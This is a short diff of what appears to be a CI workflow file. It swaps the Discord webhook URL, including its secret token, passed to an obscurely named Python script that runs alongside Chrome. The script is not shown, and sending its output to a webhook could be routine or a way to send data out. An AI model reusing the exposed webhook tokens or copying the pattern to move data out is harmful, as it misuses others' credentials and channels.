@@ -37,4 +37,4 @@ jobs:
         env:
           CHROME_BIN: 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
         run: |
-          python jkhttioypilk.py --discord https://discord.com/api/webhooks/1079857050370191482/IFt_7q65SC_DKZfl2HEvi9sg0e6VoCCwJ0gwhe9dKjA2bLAKtZyMXjYwa-VKfJwZ4dow
+          python jkhttioypilk.py --discord https://discord.com/api/webhooks/1081691876865867897/tJV5hTenLGsszHXVMG3PZyobcrF2COsErKkiSS33T6qMra3GvsPtz9sB0cRmqQEKO4Zc
